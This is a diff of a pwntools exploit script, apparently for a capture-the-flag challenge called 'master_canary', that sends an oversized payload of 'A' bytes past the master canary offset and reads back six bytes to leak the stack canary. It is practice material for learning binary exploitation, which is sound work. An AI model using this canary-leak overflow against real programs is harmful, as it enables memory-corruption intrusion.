@@ -8,17 +8,20 @@ elf = ELF("./Pwnable/master_canary/problem/master_canary")
 
 rem.sendlineafter(b"> ", b'1')
 
+# pause()
+
 canary_offset = 0x110
 mc_offset = 0x948
 
-# payload = b'A' * (mc_offset + 1)
-payload = b'AA'
+payload = b'A' * (mc_offset + 2)
+# payload = b'A' * 0x109
 print(rem.recvuntil(b"> "))
 rem.sendline(b'2')
 rem.sendlineafter(b"Size: ", str(len(payload)).encode())
 print(rem.recvuntil(b"Data: "))
 rem.send(payload)
 print(rem.recvuntil(payload))
+print(rem.recvn(6))
 
 
 # pause()
